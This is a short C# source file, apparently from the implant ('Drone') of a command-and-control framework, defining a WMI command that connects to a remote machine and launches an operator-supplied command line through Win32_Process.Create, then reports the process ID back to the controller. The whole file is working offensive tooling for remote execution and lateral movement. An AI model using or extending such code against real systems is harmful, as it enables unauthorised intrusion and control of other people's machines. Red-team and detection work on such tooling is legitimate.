using System.Management;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class WmiCommand : DroneCommand
{
    public override byte Command => 0x5D;
    public override bool Threaded => false;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var scope = new ManagementScope($@"\\{task.Arguments["target"]}\root\cimv2");
        scope.Connect();
        
        var mClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
        var parameters = mClass.GetMethodParameters("Create");
        parameters["CommandLine"] = task.Arguments["command"];
        
        var result = mClass.InvokeMethod("Create", parameters, null);
        var output = $@"returnValue = {result["returnValue"]}
processId = {result["processId"]}";

        await Drone.SendTaskOutput(task.Id, output);
    }
}